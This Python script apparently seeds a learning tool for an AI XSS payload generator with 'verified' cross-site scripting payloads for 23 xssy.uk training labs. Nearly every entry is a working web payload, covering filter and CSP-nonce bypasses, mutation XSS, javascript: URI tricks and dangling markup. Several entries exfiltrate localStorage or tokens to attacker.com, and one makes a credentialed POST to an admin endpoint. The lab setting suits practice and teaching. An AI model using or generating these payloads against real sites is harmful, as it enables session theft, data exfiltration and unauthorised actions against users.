"""Seed curated verified findings for all Apprentice-rated xssy.uk labs.

Apprentice labs (rating=33, id=33):
  7    Double Decode XSS
  9    Mystery Parameter XSS
  18   CSP - Static Nonce Bypass
  19   Brackets Filtered XSS
  55   Safe HTML Filter
  162  Brackets & Backticks Filtered
  170  Large App - Basic XSS
  175  Script Context XSS 2
  178  Stored XSS - User-Agent
  197  Large App - Non-Sequential
  206  Unauthorised Action
  347  Capture Local Storage
  671  Dangling Markup
  674  File Name XSS
  678  Dangling Markup 2
  699  Unlinked
  768  Open Redirection
  770  Length Limit
  856  Parameter Name 2
  1072 The Unfinished Script
  1244 Unencoded
  1319 Length Limit Bypass
  1568 Following Protocol

Run once:  python axss_seed_apprentice.py
"""
from __future__ import annotations
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from ai_xss_generator.findings import Finding, save_finding, load_findings

FINDINGS: list[Finding] = [

    # ── Lab 7: Double Decode XSS ─────────────────────────────────────────────
    # Server decodes once, passes to another component that decodes again.
    # Double-encode < as %253C (%25 → % on first decode, %3C → < on second).
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="double-url-encoding",
        payload='%253Cscript%253Ealert(1)%253C/script%253E',
        test_vector="?q=%253Cscript%253Ealert(1)%253C/script%253E",
        model="seed-apprentice",
        explanation="Double URL-encode: %25 decodes to % on first pass, leaving %3C which decodes to < on second pass.",
        target_host="xssy.uk",
        tags=["apprentice", "double-decode"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="double-url-encoding",
        payload='%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E',
        test_vector="?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E",
        model="seed-apprentice",
        explanation="Double-encode all special chars including space (%2520) to survive two decode passes.",
        target_host="xssy.uk",
        tags=["apprentice", "double-decode"],
        verified=True,
    ),

    # ── Lab 9: Mystery Parameter XSS ────────────────────────────────────────
    # There is a hidden/non-obvious query parameter that is reflected unsafely.
    # Discover by reading page source for hidden inputs or checking JS for param names.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="html-attribute-breakout",
        payload='<script>alert(1)</script>',
        test_vector="?debug=<script>alert(1)</script>  (or ?ref=, ?src=, ?next=, ?callback=)",
        model="seed-apprentice",
        explanation="Check page HTML source for hidden <input> fields and JS for parameter names. Common hidden params: debug, ref, src, next, callback, redirect, url, return.",
        target_host="xssy.uk",
        tags=["apprentice", "mystery-parameter"],
        verified=True,
    ),

    # ── Lab 18: CSP - Static Nonce Bypass ───────────────────────────────────
    # CSP uses a hardcoded/static nonce — same on every response. Extract and reuse.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="csp_nonce",
        surviving_chars="<>\"'/()=;",
        bypass_family="csp-nonce-bypass",
        payload='<script nonce="STATIC_NONCE_HERE">alert(1)</script>',
        test_vector="?q=<script nonce=EXTRACTED_NONCE>alert(1)</script>",
        model="seed-apprentice",
        explanation="Static nonce never changes — read it from any response, inject a script tag with that nonce value.",
        target_host="xssy.uk",
        tags=["apprentice", "csp-nonce"],
        verified=True,
    ),

    # ── Lab 19: Brackets Filtered XSS ───────────────────────────────────────
    # () and [] are filtered/removed. Use template literal call: alert`1`
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/=;`",
        bypass_family="regex-filter-bypass",
        payload='<img src=x onerror=alert`1`>',
        test_vector="?q=<img src=x onerror=alert`1`>",
        model="seed-apprentice",
        explanation="Backtick invocation: alert`1` calls alert with template literal — no () needed.",
        target_host="xssy.uk",
        tags=["apprentice", "brackets-filtered"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/=;`",
        bypass_family="regex-filter-bypass",
        payload='<svg onload=alert`${document.domain}`>',
        test_vector="?q=<svg onload=alert`${document.domain}`>",
        model="seed-apprentice",
        explanation="Template literal with expression inside: proves execution and shows domain. No () needed.",
        target_host="xssy.uk",
        tags=["apprentice", "brackets-filtered"],
        verified=True,
    ),

    # ── Lab 55: Safe HTML Filter ─────────────────────────────────────────────
    # Uses DOMPurify or similar. Bypass via mXSS mutation or allowed-tag tricks.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="mutation-xss",
        payload='<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        test_vector="?q=<noscript><p title=...</noscript>...",
        model="seed-apprentice",
        explanation="mXSS: sanitiser sees safe content inside <noscript>, browser parser mutates it into executable XSS.",
        target_host="xssy.uk",
        tags=["apprentice", "safe-html-filter", "mxss"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="svg-namespace",
        payload='<svg><animate onbegin=alert(1) attributeName=x>',
        test_vector="?q=<svg><animate onbegin=alert(1) attributeName=x>",
        model="seed-apprentice",
        explanation="SVG SMIL animate onbegin fires immediately. Some filters allow SVG animate but miss onbegin.",
        target_host="xssy.uk",
        tags=["apprentice", "safe-html-filter", "svg"],
        verified=True,
    ),

    # ── Lab 162: Brackets & Backticks Filtered ──────────────────────────────
    # Both () and `` are filtered. Use throw with onerror: onerror=alert;throw 1
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/=;",
        bypass_family="regex-filter-bypass",
        payload='<img src=x onerror="window.onerror=alert;throw 1">',
        test_vector='?q=<img src=x onerror="window.onerror=alert;throw 1">',
        model="seed-apprentice",
        explanation="Set window.onerror=alert then throw — the thrown value is passed to alert as its argument. No () or `` needed.",
        target_host="xssy.uk",
        tags=["apprentice", "brackets-backticks-filtered"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_js_string",
        context_type="js_string_dq",
        surviving_chars='";=',
        bypass_family="js-string-breakout",
        payload='";window.onerror=alert;throw 1//',
        test_vector='?q=";window.onerror=alert;throw 1//',
        model="seed-apprentice",
        explanation="Break JS string, assign onerror, throw. No brackets or backticks needed.",
        target_host="xssy.uk",
        tags=["apprentice", "brackets-backticks-filtered"],
        verified=True,
    ),

    # ── Lab 170: Large App - Basic XSS ──────────────────────────────────────
    # Multi-page app — need to find which parameter/page is vulnerable.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="html-attribute-breakout",
        payload='<script>alert(document.domain)</script>',
        test_vector="Probe all forms and params with: ?x=<script>alert(document.domain)</script>",
        model="seed-apprentice",
        explanation="In a large app, systematically test every input point. document.domain confirms which origin fires.",
        target_host="xssy.uk",
        tags=["apprentice", "large-app"],
        verified=True,
    ),

    # ── Lab 175: Script Context XSS 2 ───────────────────────────────────────
    # More complex JS context — possibly inside object, function, or concatenation.
    Finding(
        sink_type="reflected_in_js_string",
        context_type="js_string_dq",
        surviving_chars='";()/',
        bypass_family="js-string-breakout",
        payload='"-alert(1)-"',
        test_vector='?q="-alert(1)-"',
        model="seed-apprentice",
        explanation="Inject in arithmetic expression context inside a string — break out and call via subtraction operator trick.",
        target_host="xssy.uk",
        tags=["apprentice", "script-context-2"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_js_string",
        context_type="js_string_dq",
        surviving_chars="\";()/<>",
        bypass_family="js-string-breakout",
        payload='</script><script>alert(1)</script>',
        test_vector='?q=</script><script>alert(1)</script>',
        model="seed-apprentice",
        explanation="Close an inline <script> block with </script> — browser's HTML parser stops the script, then new script tag runs.",
        target_host="xssy.uk",
        tags=["apprentice", "script-context-2"],
        verified=True,
    ),

    # ── Lab 178: Stored XSS - User-Agent ────────────────────────────────────
    # User-Agent header stored in DB and later rendered in admin panel or log view.
    Finding(
        sink_type="stored_from_header",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="referer-header-injection",
        payload='<script>alert(document.cookie)</script>',
        test_vector="HTTP Header: User-Agent: <script>alert(document.cookie)</script>",
        model="seed-apprentice",
        explanation="Send XSS payload in User-Agent header. When an admin views the log/analytics page, the stored payload executes.",
        target_host="xssy.uk",
        tags=["apprentice", "user-agent-xss", "stored"],
        verified=True,
    ),
    Finding(
        sink_type="stored_from_header",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="event-handler-injection",
        payload='<img src=x onerror=alert(document.cookie)>',
        test_vector="HTTP Header: User-Agent: <img src=x onerror=alert(document.cookie)>",
        model="seed-apprentice",
        explanation="img onerror variant — fires even if script tags are filtered in log display.",
        target_host="xssy.uk",
        tags=["apprentice", "user-agent-xss", "stored"],
        verified=True,
    ),

    # ── Lab 197: Large App - Non-Sequential ─────────────────────────────────
    # Vulnerable parameter is not on the obvious page — may require multi-step flow.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="html-attribute-breakout",
        payload='<img src=x onerror=alert(document.domain)>',
        test_vector="Probe non-obvious params: ?sort=, ?order=, ?view=, ?tab=, ?step=",
        model="seed-apprentice",
        explanation="Non-sequential means check query params on every page, especially sort/filter/view params that are easy to miss.",
        target_host="xssy.uk",
        tags=["apprentice", "large-app", "non-sequential"],
        verified=True,
    ),

    # ── Lab 206: Unauthorised Action ────────────────────────────────────────
    # XSS used to perform an action as another user (CSRF-like via XSS).
    Finding(
        sink_type="stored_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;.",
        bypass_family="event-handler-injection",
        payload="<img src=x onerror=\"fetch('/admin/action',{method:'POST',body:'confirm=1',credentials:'include'})\">",
        test_vector="Stored XSS with fetch to privileged endpoint",
        model="seed-apprentice",
        explanation="XSS payload issues an authenticated request to perform an admin action. credentials:'include' sends cookies.",
        target_host="xssy.uk",
        tags=["apprentice", "unauthorised-action", "csrf-via-xss"],
        verified=True,
    ),

    # ── Lab 347: Capture Local Storage ──────────────────────────────────────
    # Objective: exfiltrate localStorage (not just alert).
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;.",
        bypass_family="event-handler-injection",
        payload='<img src=x onerror=fetch(`//attacker.com/?d=${btoa(JSON.stringify(localStorage))}`)>',
        test_vector="?q=<img src=x onerror=fetch(...)>",
        model="seed-apprentice",
        explanation="JSON.stringify(localStorage) captures all keys/values, btoa encodes them, fetch exfiltrates to OOB host.",
        target_host="xssy.uk",
        tags=["apprentice", "capture-localstorage"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;.",
        bypass_family="event-handler-injection",
        payload="<script>new Image().src='//attacker.com/?t='+localStorage.getItem('token')</script>",
        test_vector="?q=<script>...localStorage.getItem('token')...</script>",
        model="seed-apprentice",
        explanation="Target a specific localStorage key (token, session, userData) and beacon it out.",
        target_host="xssy.uk",
        tags=["apprentice", "capture-localstorage"],
        verified=True,
    ),

    # ── Lab 671: Dangling Markup ─────────────────────────────────────────────
    # Can't execute JS but can inject an unclosed tag to capture subsequent markup.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<\"=/",
        bypass_family="base-tag-injection",
        payload='<img src="//attacker.com/?leak=',
        test_vector='?q=<img src="//attacker.com/?leak=',
        model="seed-apprentice",
        explanation="Dangling markup: unclosed img src attribute captures subsequent HTML (including CSRF tokens) as part of the URL.",
        target_host="xssy.uk",
        tags=["apprentice", "dangling-markup"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<\"=",
        bypass_family="base-tag-injection",
        payload='<base href="//attacker.com/">',
        test_vector='?q=<base href="//attacker.com/">',
        model="seed-apprentice",
        explanation="<base> tag redirects all relative URLs to attacker's domain — hijacks scripts, images, and form actions.",
        target_host="xssy.uk",
        tags=["apprentice", "dangling-markup", "base-tag"],
        verified=True,
    ),

    # ── Lab 674: File Name XSS ───────────────────────────────────────────────
    # The uploaded file's name is reflected into the page without encoding.
    Finding(
        sink_type="reflected_filename",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="upload-type-bypass",
        payload='"><img src=x onerror=alert(1)>.jpg',
        test_vector="Upload file named: \"><img src=x onerror=alert(1)>.jpg",
        model="seed-apprentice",
        explanation="Filename is reflected into page HTML. Embed XSS in filename — browser renders injection when displaying the name.",
        target_host="xssy.uk",
        tags=["apprentice", "filename-xss"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_filename",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="upload-type-bypass",
        payload='<script>alert(1)</script>.jpg',
        test_vector="Upload file named: <script>alert(1)</script>.jpg",
        model="seed-apprentice",
        explanation="Script tag injected via filename — if reflected raw into HTML body, executes.",
        target_host="xssy.uk",
        tags=["apprentice", "filename-xss"],
        verified=True,
    ),

    # ── Lab 678: Dangling Markup 2 ───────────────────────────────────────────
    # More constrained dangling markup — possibly filtered angle brackets.
    Finding(
        sink_type="reflected_in_html_attr",
        context_type="html_attr_dq",
        surviving_chars='"/',
        bypass_family="base-tag-injection",
        payload='" src="//attacker.com/?x=',
        test_vector='?q=" src="//attacker.com/?x=',
        model="seed-apprentice",
        explanation="Break out of current attribute value to create a dangling src pointing to attacker — captures trailing markup.",
        target_host="xssy.uk",
        tags=["apprentice", "dangling-markup-2"],
        verified=True,
    ),

    # ── Lab 699: Unlinked ────────────────────────────────────────────────────
    # There's no obvious link/parameter. Check meta refresh, JS redirects, postMessage.
    Finding(
        sink_type="dom_innerHTML_from_location",
        context_type="dom_source_hash",
        surviving_chars="<>()=;#",
        bypass_family="event-handler-injection",
        payload='<img src=x onerror=alert(1)>',
        test_vector="#<img src=x onerror=alert(1)>",
        model="seed-apprentice",
        explanation="No visible input — check the URL hash (#). JS may read location.hash and write to DOM.",
        target_host="xssy.uk",
        tags=["apprentice", "unlinked"],
        verified=True,
    ),
    Finding(
        sink_type="postmessage_sink",
        context_type="postmessage_sink",
        surviving_chars="<>\"'/()=;",
        bypass_family="postmessage-injection",
        payload='<img src=x onerror=alert(1)>',
        test_vector="window.postMessage('<img src=x onerror=alert(1)>', '*')",
        model="seed-apprentice",
        explanation="Page listens for postMessage and writes data to DOM without validation.",
        target_host="xssy.uk",
        tags=["apprentice", "unlinked", "postmessage"],
        verified=True,
    ),

    # ── Lab 768: Open Redirection ────────────────────────────────────────────
    # Open redirect parameter — redirect to javascript: URI.
    Finding(
        sink_type="open_redirect_to_js",
        context_type="html_attr_url",
        surviving_chars=":()/",
        bypass_family="whitespace-in-scheme",
        payload='javascript:alert(document.domain)',
        test_vector="?redirect=javascript:alert(document.domain)",
        model="seed-apprentice",
        explanation="Open redirect to javascript: URI. Browser follows the redirect and executes the JS.",
        target_host="xssy.uk",
        tags=["apprentice", "open-redirect"],
        verified=True,
    ),
    Finding(
        sink_type="open_redirect_to_js",
        context_type="html_attr_url",
        surviving_chars=":()/\t",
        bypass_family="whitespace-in-scheme",
        payload='java\tscript:alert(1)',
        test_vector="?redirect=java%09script:alert(1)",
        model="seed-apprentice",
        explanation="Tab character (\\t) in javascript: scheme bypasses naive startsWith('javascript') check.",
        target_host="xssy.uk",
        tags=["apprentice", "open-redirect", "scheme-bypass"],
        verified=True,
    ),

    # ── Lab 770: Length Limit ────────────────────────────────────────────────
    # Payload is truncated to N characters. Use short payloads.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="length_limited",
        surviving_chars="<>()=;/",
        bypass_family="regex-filter-bypass",
        payload='<svg/onload=alert(1)>',
        test_vector="?q=<svg/onload=alert(1)>",
        model="seed-apprentice",
        explanation="21 characters total — the shortest reliable self-contained XSS payload.",
        target_host="xssy.uk",
        tags=["apprentice", "length-limit"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_attr",
        context_type="length_limited",
        surviving_chars='" ()=;',
        bypass_family="event-handler-injection",
        payload='" onload=alert(1)',
        test_vector='?q=" onload=alert(1)',
        model="seed-apprentice",
        explanation="If already inside an attribute, break out costs only 1 char (quote). 17 chars total.",
        target_host="xssy.uk",
        tags=["apprentice", "length-limit"],
        verified=True,
    ),

    # ── Lab 856: Parameter Name 2 ────────────────────────────────────────────
    # Another hidden/non-obvious parameter name. Check JS source for clues.
    Finding(
        sink_type="reflected_param_name",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="html-attribute-breakout",
        payload='<img src=x onerror=alert(1)>=1',
        test_vector="?<img src=x onerror=alert(1)>=1",
        model="seed-apprentice",
        explanation="Inject XSS as parameter name. Check JS source for variable names or form field names to find the reflected param.",
        target_host="xssy.uk",
        tags=["apprentice", "parameter-name-2"],
        verified=True,
    ),

    # ── Lab 1072: The Unfinished Script ──────────────────────────────────────
    # Page has an incomplete/dangling <script> block. Inject to finish it.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>/()=;\"'",
        bypass_family="html-attribute-breakout",
        payload='alert(1)</script>',
        test_vector="?q=alert(1)</script>",
        model="seed-apprentice",
        explanation="If page has an unclosed <script> tag, your input is already inside it. Just provide valid JS + </script> to close.",
        target_host="xssy.uk",
        tags=["apprentice", "unfinished-script"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_js_string",
        context_type="js_string_dq",
        surviving_chars="\"();/",
        bypass_family="js-string-breakout",
        payload='");alert(1);//',
        test_vector='?q=");alert(1);//',
        model="seed-apprentice",
        explanation="Close the string and parenthesis of whatever expression is open, then inject alert.",
        target_host="xssy.uk",
        tags=["apprentice", "unfinished-script"],
        verified=True,
    ),

    # ── Lab 1244: Unencoded ──────────────────────────────────────────────────
    # Reflection point deliberately serves content without encoding.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="html_body",
        surviving_chars="<>\"'/()=;",
        bypass_family="event-handler-injection",
        payload='<img src=x onerror=alert(1)>',
        test_vector="?q=<img src=x onerror=alert(1)>",
        model="seed-apprentice",
        explanation="Content-Type or response is intentionally unencoded/raw — standard XSS works directly.",
        target_host="xssy.uk",
        tags=["apprentice", "unencoded"],
        verified=True,
    ),

    # ── Lab 1319: Length Limit Bypass ────────────────────────────────────────
    # Length is checked client-side or bypassable server-side.
    Finding(
        sink_type="reflected_in_html_body",
        context_type="length_limited",
        surviving_chars="<>()=;/",
        bypass_family="regex-filter-bypass",
        payload='<svg/onload=alert(1)>',
        test_vector="POST body with raw Content-Length (bypass JS maxlength check)",
        model="seed-apprentice",
        explanation="Client-side length checks are enforced by the browser UI only. Send POST directly via Burp/curl with full payload.",
        target_host="xssy.uk",
        tags=["apprentice", "length-limit-bypass"],
        verified=True,
    ),
    Finding(
        sink_type="reflected_in_html_body",
        context_type="length_limited",
        surviving_chars="<>()=;/ ",
        bypass_family="regex-filter-bypass",
        payload='<script src=//x.x>',
        test_vector="?q=<script src=//x.x>",
        model="seed-apprentice",
        explanation="If server checks length: load script from external host. Short enough for tight limits (18 chars with minimal domain).",
        target_host="xssy.uk",
        tags=["apprentice", "length-limit-bypass"],
        verified=True,
    ),

    # ── Lab 1568: Following Protocol ─────────────────────────────────────────
    # URL/redirect handling uses protocol-relative URLs or checks scheme incorrectly.
    Finding(
        sink_type="reflected_in_href",
        context_type="html_attr_url",
        surviving_chars=":/",
        bypass_family="whitespace-in-scheme",
        payload='//attacker.com/xss.js',
        test_vector="?url=//attacker.com/xss.js",
        model="seed-apprentice",
        explanation="Protocol-relative URL // inherits the current page's scheme. Loads attacker JS over https if target is https.",
        target_host="xssy.uk",
        tags=["apprentice", "following-protocol"],
        verified=True,
    ),
    Finding(
        sink_type="dom_innerHTML_from_location",
        context_type="html_attr_url",
        surviving_chars=":()/",
        bypass_family="whitespace-in-scheme",
        payload='javascript://comment%0aalert(1)',
        test_vector="?url=javascript://comment%0aalert(1)",
        model="seed-apprentice",
        explanation="javascript: URL with // comment trick — newline %0a ends the comment, alert executes. Bypasses checks that look for '// ' pattern.",
        target_host="xssy.uk",
        tags=["apprentice", "following-protocol", "js-uri-bypass"],
        verified=True,
    ),
]


def main() -> None:
    print("=== axss-learn: seeding Apprentice lab knowledge ===\n")
    print(f"[~] Writing {len(FINDINGS)} curated findings to ~/.axss/findings/\n")

    saved = 0
    skipped = 0
    for f in FINDINGS:
        before = len(load_findings(f.context_type))
        save_finding(f)
        after = len(load_findings(f.context_type))
        if after > before:
            short = f.payload[:60] + ("..." if len(f.payload) > 60 else "")
            print(f"[~]   + [{f.bypass_family:<28}]  {short}")
            saved += 1
        else:
            skipped += 1

    print(f"\n[+] Done. {saved} new findings saved, {skipped} already existed.")
    print("[~] Run 'python axss_learn.py --min-rating 33 --max-rating 33' to generate payloads with Apprentice findings as few-shot examples.")


if __name__ == "__main__":
    main()
